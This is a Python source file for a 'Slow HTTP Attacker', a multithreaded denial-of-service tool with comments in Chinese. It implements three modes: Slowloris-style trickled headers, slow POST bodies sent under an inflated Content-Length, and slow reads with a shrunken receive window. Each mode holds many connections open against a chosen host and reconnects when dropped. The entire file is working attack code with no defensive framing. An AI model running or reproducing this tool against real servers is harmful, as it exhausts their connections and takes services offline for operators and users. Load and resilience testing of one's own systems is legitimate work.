import logging
import random
import socket
import sys
import threading
import time
import string
import ssl
from enum import Enum
from socket_utils import send_line, send_header, send_utf8
from constants import user_agents


class Mode(Enum):
    HEADER = 1
    POST = 2
    READ = 3


class Attacker:
    def __init__(self, sockets, mode, host, port, path, sleeptime, https, randuseragent, window):
        self.lock = threading.Lock()
        self.is_stopped = False
        self.thread_cnt = 0

        self.sockets = sockets
        self.mode = mode
        self.host = host
        self.port = port
        self.path = path
        self.sleeptime = sleeptime
        self.https = https
        self.randuseragent = randuseragent
        self.window = window

    def init_socket(self):
        """
        初始化一个用于 HTTP/HTTPS 的 socket 并返回
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)

        if self.https:
            s = ssl.wrap_socket(s)

        if self.mode == Mode.READ:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, self.window)

        s.connect((self.host, self.port))

        ua = user_agents[0]
        if self.randuseragent:
            ua = random.choice(user_agents)

        if self.mode == Mode.HEADER:
            send_line(s, f"GET {self.path}?{random.randint(0, 2000)} HTTP/1.1")
            send_header(s, "Host", self.host)
            send_header(s, "User-Agent", ua)
            send_header(s, "Accept-language", "en-US,en,q=0.5")
        elif self.mode == Mode.POST:
            send_line(s, f"POST {self.path} HTTP/1.1")
            send_header(s, "Host", self.host)
            send_header(s, "User-Agent", ua)
            send_header(s, "Accept-language", "en-US,en,q=0.5")
            send_header(s, "Content-Length", random.randint(4000, 5000))
            send_header(s, "Content-Type", "application/x-www-form-urlencoded")
            send_line(s)
        elif self.mode == Mode.READ:
            send_line(s, f"GET {self.path}?{random.randint(0, 2000)} HTTP/1.1")
            send_header(s, "Host", self.host)
            send_header(s, "User-Agent", ua)
            send_header(s, "Accept-language", "en-US,en,q=0.5")
            send_line(s)
        else:
            assert 0
        return s

    def _single_attack(self):
        """
        使用单个 socket 发起攻击
        """
        while True:
            with self.lock:
                if self.is_stopped:
                    self.thread_cnt -= 1
                    sys.exit(0)

            try:
                logging.debug("Creating socket...")
                s = self.init_socket()
            except socket.error as e:
                logging.error(e)
                with self.lock:
                    self.thread_cnt -= 1
                break

            try:
                if self.mode == Mode.HEADER or self.mode == Mode.POST:
                    while True:
                        with self.lock:
                            if self.is_stopped:
                                s.close()
                                self.thread_cnt -= 1
                                sys.exit(0)
                        logging.debug("Sending a beat...")
                        if self.mode == Mode.HEADER:
                            send_header(s, "X-a", random.randint(1, 5000))
                        elif self.mode == Mode.POST:
                            send_utf8(s, ''.join(random.choices(string.ascii_letters, k=7)) + '=' + ''.join(
                                random.choices(string.ascii_letters, k=3)) + '&')
                        logging.debug("Sleeping for %d seconds", self.sleeptime)
                        time.sleep(self.sleeptime)

                elif self.mode == Mode.READ:
                    while True:
                        with self.lock:
                            if self.is_stopped:
                                s.close()
                                self.thread_cnt -= 1
                                sys.exit(0)
                        logging.debug('receive: ' + s.recv(self.window).decode())
            except socket.error:
                logging.debug('The connection is closed. Gonna recreate.')
                continue

    def attack(self):
        """
        使用 sockets 个线程发起攻击
        """
        try:
            logging.info('Starting Slow HTTP Attacker...')
            logging.info('sockets: %d' % self.sockets)
            logging.info('mode: %s' % self.mode.name)
            logging.info('host: %s' % self.host)
            logging.info('port: %d' % self.port)
            logging.info('path: %s' % self.path)
            logging.info('HTTPS: %s' % self.https.__str__())
            if self.mode == Mode.POST or self.mode == Mode.HEADER:
                logging.info('sleeptime: %d' % self.sleeptime)
            logging.info('randuseragent: %s' % self.randuseragent.__str__())
            if self.mode == Mode.READ:
                logging.info('window: %d' % self.window)
            thread_pool = []
            self.thread_cnt = self.sockets
            thread_cnt = self.thread_cnt
            for i in range(0, self.sockets):
                thread_pool.append(threading.Thread(target=self._single_attack, args=()))
                thread_pool[i].start()
            while True:
                print('\rRemaining threads: %d' % thread_cnt, end='')
                time.sleep(5)
                with self.lock:
                    thread_cnt = self.thread_cnt
        except (KeyboardInterrupt, SystemExit):
            with self.lock:
                self.is_stopped = True
            print()
            if self.mode == Mode.HEADER or self.mode == Mode.POST:
                logging.info('Stopping Slow HTTP Attacker. Please wait at most %d seconds...' % self.sleeptime)
            elif self.mode == Mode.READ:
                logging.info('Stopping Slow HTTP Attacker...')
            sys.exit(0)
